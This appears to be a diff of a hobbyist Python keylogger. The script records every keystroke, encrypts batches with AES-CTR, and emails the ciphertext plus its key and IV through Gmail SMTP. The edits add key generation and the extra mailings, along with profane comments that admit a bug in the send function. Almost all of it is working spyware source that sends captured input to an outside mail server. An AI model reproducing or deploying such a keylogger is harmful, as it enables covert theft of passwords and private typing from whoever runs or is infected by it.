@@ -6,6 +6,7 @@ import smtplib
 import Cryptodome
 import pyaes, pbkdf2, binascii, os, secrets
 from pynput.keyboard import Key, Listener
+from Crypto.Random import get_random_bytes
 
 
 
@@ -22,7 +23,7 @@ print (r"""
 \_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                              """)
 print ("""================================================================""")
-print(""" By: CTC """)
+print("""By: CTC """)
 
 #Asks user for input, then sets up a mail account to send the input to
 #Resource from: https://realpython.com/python-send-email/
@@ -31,13 +32,20 @@ password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
-#building the keylogger function
+#Defining the essential variables
+converted_key = ''
+converted_iv = ''
+key = ''
+plaintext = ''
+ciphertext = ''
 data_to_be_encrypted = ''
 data_to_be_sent = ''
 full_log = ''
 word = ''
-email_char_lim = 10
+email_char_lim = 50
+iv = ''
 
+#Building the keylogger (seems to work just fine)
 def on_press(key):
     global word
     global full_log
@@ -50,7 +58,6 @@ def on_press(key):
         word = ''
     if len(full_log) >= email_char_lim:
             data_to_be_encrypted = full_log
-            print(full_log)
             full_log = ''
             if len(data_to_be_encrypted) >= email_char_lim:
                encryption()
@@ -68,40 +75,62 @@ def on_press(key):
     if key == Key.esc:
      return False
 
-#Encryption function
+#My most precious fucking encryption function i swear i will fucking kill this piece of shit code
 
 def encryption():
+    global converted_iv
+    global converted_key
+    global email_char_lim
+    global key
+    global iv
+    global ciphertext
+    global plaintext
     global data_to_be_sent
     global data_to_be_encrypted
     password = "passw0rd"
-    passwordSalt = os.urandom(16)
-    key = pbkdf2.PBKDF2(password, passwordSalt).read(32)
+    key = get_random_bytes(32)
     iv = secrets.randbits(256)
     plaintext = data_to_be_encrypted
-    print(data_to_be_encrypted)
     aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
     ciphertext = aes.encrypt(plaintext)
     data_to_be_sent = ciphertext
-    print(ciphertext)
+    print(key)
+    print(iv)
+    converted_iv = str(iv)
+    converted_key = str(key)
     
+    
+    #if the lenght of the ciphertext is more than the limit everything gets reseted
     if len(data_to_be_sent) >= email_char_lim:
         send_log()
         data_to_be_encrypted = ''
         plaintext = ''
         full_log = ''
         data_to_be_sent = ''
-        print(data_to_be_sent)
-
-#if ciphertext is the same lenght as email_char_limit everything is reseted
+        ciphertext = ''
 
 
-#This shit ddefines the send_log function 
+
+#This shit ddefines the send_log function which does not seem to work cuz int object has no attribute 'lower'
 def send_log():
-    server.sendmail(
+  global converted_iv
+  global converted_key
+  global data_to_be_sent
+  server.sendmail(
           email,
           email,
           data_to_be_sent
      )
-
+  server.sendmail(
+          email,
+          email,
+          converted_iv
+     )
+  server.sendmail(
+          email,
+          email,
+          converted_key
+     )
+#This stuff starts the listener shit
 with Listener( on_press=on_press ) as listener:
       listener.join()
